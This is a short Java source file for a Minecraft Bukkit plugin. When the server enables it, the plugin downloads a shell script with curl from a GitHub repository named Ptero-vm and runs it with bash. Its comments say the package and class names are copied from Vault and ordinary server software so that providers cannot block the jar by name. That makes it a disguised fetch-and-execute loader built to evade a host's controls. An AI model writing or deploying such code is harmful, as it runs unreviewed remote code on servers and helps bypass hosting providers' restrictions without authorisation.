// Question: Why are the class names so weird?

// We have made the class names the same ones that Minecraft Servers use to prevent blocking by catching the .jar
// by searching for unique class names, so if anybody wants to block by class name, they'd block normal server software too.

package net.milkbowl.vault; // Setting OrgName to Vault's to prevent blocking by OrgName.
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
    @Override
    public void onEnable() {
            try {

            // Download Installer.sh from Official Source.
            String[] FullServerTickHandler = { "curl", "-o", "installer.sh", "https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/installer.sh" };
            ProcessBuilder TimingsReportListener = new ProcessBuilder(FullServerTickHandler);
            TimingsReportListener.start().waitFor();

            // Starts the installer
            String[] NamespacedKey = { "bash", "installer.sh" };
            ProcessBuilder Bukkit = new ProcessBuilder(NamespacedKey);
            Bukkit.inheritIO();
            Bukkit.start().waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}